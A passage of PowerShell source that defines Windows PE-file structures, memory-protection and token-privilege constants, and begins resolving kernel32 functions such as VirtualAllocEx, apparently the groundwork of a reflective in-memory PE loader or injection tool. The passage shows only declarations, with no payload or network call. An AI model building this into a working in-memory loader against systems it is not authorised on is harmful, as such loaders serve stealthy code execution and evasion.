            $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
            $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
            $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
            $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
            $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
            $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
            $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
            $SubSystemType = $TypeBuilder.CreateType()
            $Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

            #Enum DllCharacteristicsType
            $TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
            $TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
            $TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
            $TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
            $TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
            $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
            $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
            $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
            $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
            $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
            $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
            $TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
            $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
            $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
            $DllCharacteristicsType = $TypeBuilder.CreateType()
            $Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

            ###########    STRUCT    ###########
            #Struct IMAGE_DATA_DIRECTORY
            $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
            $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
        ($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
            $IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
            $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

            #Struct IMAGE_FILE_HEADER
            $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
            $TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
            $TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
            $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
            $TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
            $TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
            $TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
            $TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
            $IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
            $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

            #Struct IMAGE_OPTIONAL_HEADER64
            $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
            $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
            $IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
            $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

            #Struct IMAGE_OPTIONAL_HEADER32
            $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
            $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
            $IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
            $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

            #Struct IMAGE_NT_HEADERS64
            $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
            $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
            $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
            $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
            $IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
            $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
        
            #Struct IMAGE_NT_HEADERS32
            $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
            $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
            $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
            $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
            $IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
            $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

            #Struct IMAGE_DOS_HEADER
            $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
            $TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
            $TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
            $TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
            $TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
            $TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
            $TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
            $TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
            $TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
            $TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
            $TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
            $TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
            $TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
            $TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
            $TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

            $e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
            $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
            $FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
            $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
            $e_resField.SetCustomAttribute($AttribBuilder)

            $TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
            $TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

            $e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
            $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
            $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
            $e_res2Field.SetCustomAttribute($AttribBuilder)

            $TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
            $IMAGE_DOS_HEADER = $TypeBuilder.CreateType()   
            $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

            #Struct IMAGE_SECTION_HEADER
            $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

            $nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
            $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
            $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
            $nameField.SetCustomAttribute($AttribBuilder)

            $TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
            $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
            $TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
            $TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
            $TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
            $TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
            $TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
            $TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
            $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
            $IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
            $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

            #Struct IMAGE_BASE_RELOCATION
            $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
            $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
            $TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
            $IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
            $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

            #Struct IMAGE_IMPORT_DESCRIPTOR
            $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
            $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
            $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
            $TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
            $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
            $TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
            $IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
            $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

            #Struct IMAGE_EXPORT_DIRECTORY
            $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
            $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
            $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
            $TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
            $TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
            $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
            $TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
            $TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
            $TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
            $TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
            $TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
            $TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
            $IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
            $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
        
            #Struct LUID
            $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
            $TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
            $TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
            $LUID = $TypeBuilder.CreateType()
            $Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
        
            #Struct LUID_AND_ATTRIBUTES
            $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
            $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
            $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
            $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
            $Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
        
            #Struct TOKEN_PRIVILEGES
            $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
            $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
            $TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
            $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
            $Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

            return $Win32Types
        }

        Function Get-Win32Constants {
            $Win32Constants = New-Object System.Object
        
            $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
            $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
            $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
            $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
            $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
            $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
            $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
            $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
            $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
            $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
            $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
            $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
            $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
            $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
            $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
            $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
            $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
            $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
            $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
            $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
            $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
            $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
            $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
            $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
            $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
            $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
            $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
            $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
            $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
        
            return $Win32Constants
        }

        Function Get-Win32Functions {
            $Win32Functions = New-Object System.Object
        
            $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
            $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
            $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
            $Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
        
            $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
